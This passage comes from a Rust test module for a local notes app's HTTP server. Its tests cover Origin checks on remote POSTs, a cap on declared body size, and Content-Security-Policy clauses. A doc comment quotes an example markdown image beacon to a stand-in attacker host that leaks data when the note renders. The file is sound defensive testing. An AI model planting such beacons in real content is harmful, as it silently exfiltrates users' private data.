        let (status, _) = remote(&raw, Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    /// The missing-`Origin` carve-out is loopback-only. It exists because a non-browser client
    /// has no ambient credentials to abuse — and a paired device carries exactly that, a cookie
    /// a browser attaches to requests from any page it loads.
    #[test]
    fn a_remote_post_must_state_its_origin() {
        let raw = format!(
            "POST /api/ping HTTP/1.1\r\nHost: 192.168.1.5:8765\r\nCookie: {SHARE_COOKIE}={TOKEN}\r\n\r\n"
        );
        let (status, _) = remote(&raw, Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 403 Forbidden");

        // …while loopback keeps it, which is what `fm-cli`, curl and the study agent rely on.
        let (status, _) = request("POST /api/ping HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// A declared body far larger than the remote ceiling is refused *before* anything is
    /// allocated. The old code sized a buffer from this header alone, so fifty sockets claiming
    /// half a gigabyte each cost ~25 GB of memory and no payload.
    #[test]
    fn a_remote_peer_cannot_make_us_allocate_from_a_promise() {
        let raw = format!(
            "POST /api/ingest HTTP/1.1\r\nHost: 192.168.1.5:8765\r\n\
             Origin: http://192.168.1.5:8765\r\nCookie: {SHARE_COOKIE}={TOKEN}\r\n\
             Content-Length: 536870911\r\n\r\n"
        );
        let (status, _) = remote(&raw, Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 413 Payload Too Large");
    }

    /// The beacon guard. A note that arrives through a merge or a shared vault can contain
    /// `![](https://attacker/p.png?leak=…)`, which fetches on render with no script involved
    /// — so the policy has to be on the response, not in the sanitiser.
    #[test]
    fn every_response_carries_a_policy_that_stops_a_note_phoning_home() {
        let (_, headers) = request("GET / HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        let csp = headers
            .lines()
            .find_map(|l| l.strip_prefix("Content-Security-Policy: "))
            .unwrap_or_else(|| panic!("no CSP on a page response:\n{headers}"));

        // A remote image must not be loadable, and a remote `fetch` must not be reachable.
        assert!(csp.contains("img-src 'self' data: blob:"), "{csp}");
        assert!(csp.contains("connect-src 'self'"), "{csp}");
        assert!(csp.contains("default-src 'self'"), "{csp}");
        // `default-src` does NOT back-stop this one, and the server sits at a fixed localhost
        // port with no auth — so without it any page the user visits can frame the app and
        // overlay a destructive control.
        assert!(csp.contains("frame-ancestors 'none'"), "{csp}");
        // `'unsafe-eval'` would hand every string in a note a path to execution. Excalidraw's
        // font subsetter wants it; we accept the degraded export instead (see `CSP`).
        assert!(!csp.contains("'unsafe-eval'") || csp.contains("'wasm-unsafe-eval'"), "{csp}");
        assert!(!csp.replace("'wasm-unsafe-eval'", "").contains("'unsafe-eval'"), "{csp}");
        // The clause worth protecting: no inline scripts, so a sanitiser bypass is not
        // automatically code execution. Excalidraw's asset-path line lives in its own file
        // to keep this true — if that regresses, this test is the alarm.
        let scripts = csp.split("script-src").nth(1).unwrap_or("");
        assert!(
            !scripts.split(';').next().unwrap_or("").contains("'unsafe-inline'"),
            "script-src must never allow inline: {csp}"
        );
    }

    /// The read view renders a PDF in an `<iframe>` at `/api/blob/…` (`ui/src/lib/render.ts`).
    /// `frame-src 'none'` blocked that outright, on the desktop and the phone, and **nothing
    /// caught it**: a blocked frame is a placeholder rather than an error, and the only test
    /// that touched this path (`ui/src/lib/render.test.ts`) asserts the element in jsdom, where
    /// no CSP is applied at all. Meanwhile two strings told the user PDFs were shown. Pinned
    /// here, against the real header, so the clause cannot quietly return to `'none'`.
    #[test]
    fn the_policy_lets_the_read_view_frame_its_own_pdf() {
        let (_, headers) = request("GET / HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        let csp = headers
            .lines()
            .find_map(|l| l.strip_prefix("Content-Security-Policy: "))
            .unwrap_or_else(|| panic!("no CSP on a page response:\n{headers}"));

        let frame = csp.split("frame-src").nth(1).unwrap_or("").split(';').next().unwrap_or("");
        assert!(
            frame.contains("'self'"),
            "frame-src must allow 'self' or the read view cannot show a PDF: {csp}"
        );
        // Same origin and no further: the widening buys the blob route, never a remote document.
        assert!(
            !frame.contains('*') && !frame.contains("http"),
            "frame-src must stay same-origin: {csp}"
        );
        // Unchanged by the widening — framing *us* is still forbidden.
        assert!(csp.contains("frame-ancestors 'none'"), "{csp}");
    }

    #[test]
    fn query_params_become_named_arguments() {
        let got: Vec<_> = query_pairs("name=my%20photo.png&vault=lab").collect();
        assert_eq!(
            got,
            vec![
                ("name".to_string(), "my photo.png".to_string()),
                ("vault".to_string(), "lab".to_string())
            ]
        );
    }

    /// An empty query string must not synthesise an empty argument — `ingest` with no
    /// `name` falls back to "asset", and a `Some("")` would defeat that.
    #[test]
    fn an_empty_query_string_yields_no_arguments() {
        assert_eq!(query_pairs("").count(), 0);
    }
}
